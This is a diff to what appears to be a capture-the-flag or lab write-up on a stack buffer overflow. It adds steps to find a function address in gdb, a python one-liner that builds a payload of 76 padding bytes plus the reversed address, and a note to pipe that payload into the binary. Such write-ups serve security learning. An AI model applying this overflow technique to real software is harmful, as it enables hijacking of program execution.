@@ -9,3 +9,14 @@ to do so first we need no know the address of that function, the offset in this 
 
 
 first we get the adress running the program trough gdb and extracting the value with info functions
+
+0x08048444
+
+so we can do the python script to create a custom payload 
+
+python -c 'print "a" * 76 + "\x08\x04\x84\x44"[::-1]' > payload
+
+
+and then we execute the payload with pipes to exploit the binnary
+
+
